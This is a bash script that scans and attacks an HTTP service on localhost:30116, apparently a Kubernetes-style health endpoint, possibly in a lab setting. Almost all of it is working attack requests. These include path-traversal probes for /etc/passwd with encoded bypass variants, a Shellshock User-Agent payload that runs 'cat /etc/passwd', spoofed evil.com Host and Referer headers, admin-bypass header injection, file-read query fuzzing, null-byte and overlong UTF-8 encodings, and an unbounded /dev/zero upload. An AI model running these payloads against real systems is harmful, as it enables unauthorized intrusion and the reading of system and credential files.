#!/bin/bash

TARGET="localhost:30116"
OUTPUT_DIR="healthz_enum_$(date +%s)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting robust enumeration of $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 1. HTTP Methods Enumeration
echo -e "\n${YELLOW}[+] Testing HTTP Methods${NC}"
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
    echo -n "  $method: "
    response=$(curl -s -X $method -w "\n%{http_code}" "http://$TARGET/" 2>/dev/null)
    code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    echo "$code"
    echo "$body" > "$OUTPUT_DIR/method_${method}.txt"
    [ "$code" != "200" ] && [ "$code" != "405" ] && echo -e "${RED}    Unusual response!${NC}"
done

# 2. Path Traversal & Directory Enumeration
echo -e "\n${YELLOW}[+] Testing Path Traversal${NC}"
paths=(
    "/"
    "/healthz"
    "/livez"
    "/readyz"
    "/metrics"
    "/debug/pprof"
    "/debug/pprof/heap"
    "/debug/pprof/goroutine"
    "/api"
    "/api/v1"
    "/apis"
    "/version"
    "/swagger.json"
    "/openapi/v2"
    "/../"
    "/../../"
    "/../../../etc/passwd"
    "/..%2f..%2f..%2fetc/passwd"
    "/.."
    "/."
    "/config"
    "/env"
    "/status"
    "/info"
    "/stats"
)

for path in "${paths[@]}"; do
    echo -n "  Testing: $path "
    response=$(curl -s -w "\n%{http_code}" "http://$TARGET${path}" 2>/dev/null)
    code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    echo "[$code]"
    
    if [ "$code" == "200" ] && [ -n "$body" ]; then
        echo "$body" > "$OUTPUT_DIR/path_$(echo $path | sed 's/\//_/g').txt"
        [ "$path" != "/" ] && echo -e "${RED}    Non-root path accessible!${NC}"
    fi
done

# 3. Header Injection
echo -e "\n${YELLOW}[+] Testing Header Injection${NC}"
headers=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "Host: evil.com"
    "Referer: http://evil.com"
    "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'"
)

for header in "${headers[@]}"; do
    echo -n "  $header: "
    response=$(curl -s -H "$header" -w "%{http_code}" "http://$TARGET/" 2>/dev/null)
    echo "$response" | tail -c 4
    echo "$response" > "$OUTPUT_DIR/header_$(echo $header | cut -d: -f1).txt"
done

# 4. Query Parameter Fuzzing
echo -e "\n${YELLOW}[+] Testing Query Parameters${NC}"
params=(
    "?debug=true"
    "?verbose=1"
    "?format=json"
    "?format=xml"
    "?namespace=kube-system"
    "?service=kubernetes"
    "?token=admin"
    "?../../etc/passwd"
    "?file=/etc/passwd"
)

for param in "${params[@]}"; do
    echo -n "  $param: "
    response=$(curl -s -w "%{http_code}" "http://$TARGET/${param}" 2>/dev/null)
    echo "$response" | tail -c 4
done

# 5. Content-Type Variations
echo -e "\n${YELLOW}[+] Testing Content-Type Handling${NC}"
content_types=(
    "application/json"
    "application/xml"
    "text/plain"
    "multipart/form-data"
    "application/x-www-form-urlencoded"
)

for ct in "${content_types[@]}"; do
    echo -n "  $ct: "
    response=$(curl -s -X POST -H "Content-Type: $ct" \
        -d '{"test":"data"}' -w "%{http_code}" "http://$TARGET/" 2>/dev/null)
    echo "$response" | tail -c 4
done

# 6. Large Payload Test
echo -e "\n${YELLOW}[+] Testing Large Payloads${NC}"
echo -n "  10KB payload: "
large_data=$(python3 -c "print('A' * 10240)")
response=$(curl -s -X POST -d "$large_data" -w "%{http_code}" \
    "http://$TARGET/" 2>/dev/null)
echo "$response" | tail -c 4

echo -n "  1MB payload: "
response=$(timeout 5 curl -s -X POST --data-binary "@/dev/zero" \
    --header "Content-Length: 1048576" -w "%{http_code}" \
    "http://$TARGET/" 2>/dev/null)
[ $? -eq 124 ] && echo "TIMEOUT" || echo "$response" | tail -c 4

# 7. Special Characters & Encoding
echo -e "\n${YELLOW}[+] Testing Special Characters${NC}"
special_chars=(
    "%00"
    "%0a%0d"
    "%2e%2e%2f"
    "%252e%252e%252f"
    "..%c0%af"
    "..%c1%9c"
)

for char in "${special_chars[@]}"; do
    echo -n "  $char: "
    response=$(curl -s "http://$TARGET/${char}" -w "%{http_code}" 2>/dev/null)
    echo "$response" | tail -c 4
done

# 8. Timing Analysis
echo -e "\n${YELLOW}[+] Performing Timing Analysis${NC}"
for i in {1..10}; do
    time_ms=$(curl -o /dev/null -s -w "%{time_total}\n" "http://$TARGET/")
    echo "  Request $i: ${time_ms}s"
    echo "$time_ms" >> "$OUTPUT_DIR/timing.txt"
done

# 9. Connection Handling
echo -e "\n${YELLOW}[+] Testing Connection Handling${NC}"
echo -n "  Keep-Alive: "
curl -s -H "Connection: keep-alive" -w "%{http_code}" \
    "http://$TARGET/" > /dev/null 2>&1
echo $?

echo -n "  Pipelining: "
(echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\n\r\nGET / HTTP/1.1\r\nHost: $TARGET\r\n\r\n") | \
    nc -w 2 ${TARGET%:*} ${TARGET#*:} > "$OUTPUT_DIR/pipelining.txt" 2>&1
[ -s "$OUTPUT_DIR/pipelining.txt" ] && echo "Response received" || echo "No response"

# 10. Error Handling
echo -e "\n${YELLOW}[+] Testing Error Handling${NC}"
echo -n "  Malformed HTTP: "
echo "INVALID HTTP REQUEST" | nc -w 2 ${TARGET%:*} ${TARGET#*:} \
    > "$OUTPUT_DIR/malformed.txt" 2>&1
[ -s "$OUTPUT_DIR/malformed.txt" ] && echo "Response received" || echo "Connection closed"

# 11. Version Detection
echo -e "\n${YELLOW}[+] Checking for Version Info${NC}"
response=$(curl -s -I "http://$TARGET/")
echo "$response" | grep -i "server:"
echo "$response" | grep -i "x-"
echo "$response" > "$OUTPUT_DIR/headers.txt"

# 12. JSON Structure Analysis
echo -e "\n${YELLOW}[+] Analyzing JSON Response${NC}"
response=$(curl -s "http://$TARGET/")
echo "$response" | jq . > "$OUTPUT_DIR/response_pretty.json" 2>/dev/null
echo "  Keys found:"
echo "$response" | jq -r 'keys[]' 2>/dev/null | sed 's/^/    /'

# Summary
echo -e "\n${GREEN}[*] Enumeration Complete!${NC}"
echo "[*] Check $OUTPUT_DIR/ for detailed results"
echo ""
echo "Summary of findings:"
grep -r "unusual\|accessible\|received" "$OUTPUT_DIR/" 2>/dev/null | wc -l | \
    xargs -I {} echo "  {} potential issues found"
